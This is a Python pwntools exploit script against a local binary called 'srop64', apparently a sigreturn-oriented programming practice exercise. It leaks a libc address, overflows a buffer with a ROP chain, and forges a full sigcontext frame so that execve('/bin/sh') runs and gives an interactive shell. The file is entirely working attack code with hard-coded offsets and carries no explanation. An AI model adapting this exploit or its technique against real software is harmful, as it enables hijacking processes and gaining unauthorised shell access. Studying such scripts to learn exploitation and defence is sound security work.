from pwn import *
context.arch = "amd64"

binary = ELF('./srop64')
p = process(binary.path)
p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)

#You need to change the value to match the environment you are testing.
libcBase = stackAddr - 0x55800
binsh = libcBase + 0x18cd57
syscall = libcBase + 0xbc375 
#syscall = 0xffffffffff600007
poprax = libcBase + 0x33544
 
print hex(libcBase)
print hex(binsh)
print hex(syscall)
 
exploit = ''
exploit += "\x90" * 72
exploit += p64(poprax)
exploit += p64(0xf)
exploit += p64(syscall)

#ucontext
exploit += p64(0x0) * 5

#sigcontext
exploit += p64(0x0)	#R8
exploit += p64(0x0)	#R9
exploit += p64(0x0)	#R10
exploit += p64(0x0)	#R11
exploit += p64(0x0)	#R12
exploit += p64(0x0)	#R13
exploit += p64(0x0)	#R14
exploit += p64(0x0)	#R15

exploit += p64(binsh)	#RDI
exploit += p64(0x0)	#RSI
exploit += p64(0x0)	#RBP
exploit += p64(0x0)	#RBX
exploit += p64(0x0)	#RDX
exploit += p64(constants.SYS_execve)	#RAX
exploit += p64(0x0)	#RCX
exploit += p64(syscall)	#RSP
exploit += p64(syscall)	#RIP
exploit += p64(0x0)	#eflags
exploit += p64(0x33)	#cs
exploit += p64(0x0)	#gs
exploit += p64(0x0)	#fs
exploit += p64(0x2b)	#ss

p.send(exploit)
p.interactive()
